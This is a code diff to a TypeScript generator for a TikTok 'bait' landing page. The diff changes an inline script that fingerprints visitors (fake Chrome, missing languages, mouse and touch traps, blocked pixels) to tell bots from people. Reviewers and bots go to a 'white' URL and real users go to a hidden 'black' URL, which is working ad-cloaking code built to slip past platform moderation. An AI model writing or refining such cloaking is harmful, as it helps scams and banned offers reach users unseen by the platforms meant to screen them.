@@ -254,13 +254,17 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
         lastX=e.clientX;lastY=e.clientY;
       });
       
-      // Send telemetry before redirect - use GET pixel (most reliable through proxies)
-      function sendT(dest){
+      // PIXEL VALIDATION: Redirect to BLACK only if pixel loads successfully
+      // Bots that block image requests will fail and go to WHITE
+      var pixelLoaded=false;
+      var pixelTimeout=null;
+      
+      // Build telemetry data
+      function buildMetrics(dest){
         T.total=Date.now()-T.start;
         T.dest=dest;
         T.teleport=teleport;
-        // Compress data to fit in URL (key metrics only)
-        var m={
+        return {
           d:dest,
           t:T.total,
           tc:T.touch,
@@ -279,17 +283,24 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
           tr:T.trap?1:0,
           tp:T.teleport||0
         };
-        try{
-          // Use pixel GET - most reliable through proxies
-          var img=new Image();
-          img.src=tUrl+'?m='+encodeURIComponent(btoa(JSON.stringify(m)));
-        }catch(e){}
       }
       
-      // Bot detection
+      // Send telemetry via pixel - returns promise-like with callbacks
+      function sendPixel(dest,onSuccess,onFail){
+        var m=buildMetrics(dest);
+        try{
+          var img=new Image();
+          img.onload=function(){pixelLoaded=true;if(onSuccess)onSuccess()};
+          img.onerror=function(){if(onFail)onFail('pixel_blocked')};
+          img.src=tUrl+'?m='+encodeURIComponent(btoa(JSON.stringify(m)));
+        }catch(e){if(onFail)onFail('pixel_error')}
+      }
+      
+      // Bot detection - send to WHITE
       function logBot(r){
         T.bot=r;
-        sendT('white');
+        // Try to send telemetry (may fail for bots)
+        sendPixel('white',null,null);
         var img=new Image();
         img.src=bl+'&r='+encodeURIComponent(r);
         setTimeout(function(){window.location=w},50);
@@ -303,12 +314,38 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
       if(T.fakeC){botDetected=true;logBot('fake_chrome');return}
       if(T.noLang){botDetected=true;logBot('no_languages');return}
       
-      // Redirect to BLACK after delay (only if no bot detected during wait)
+      // After delay, try to load pixel - only go to BLACK if it succeeds
       setTimeout(function(){
-        if(!botDetected){
-          sendT('black');
-          window.location=b;
-        }
+        if(botDetected)return;
+        
+        // Set a hard timeout for pixel loading (500ms max)
+        pixelTimeout=setTimeout(function(){
+          if(!pixelLoaded&&!botDetected){
+            // Pixel didn't load in time = bot blocking images
+            botDetected=true;
+            var img=new Image();
+            img.src=bl+'&r=pixel_timeout';
+            window.location=w;
+          }
+        },500);
+        
+        // Try to send pixel - only go to BLACK on success
+        sendPixel('black',function(){
+          // SUCCESS: Pixel loaded = real user, go to BLACK
+          clearTimeout(pixelTimeout);
+          if(!botDetected){
+            window.location=b;
+          }
+        },function(reason){
+          // FAIL: Pixel blocked = bot, go to WHITE
+          clearTimeout(pixelTimeout);
+          if(!botDetected){
+            botDetected=true;
+            var img=new Image();
+            img.src=bl+'&r='+encodeURIComponent(reason);
+            window.location=w;
+          }
+        });
       },d);
     })();
   </script>
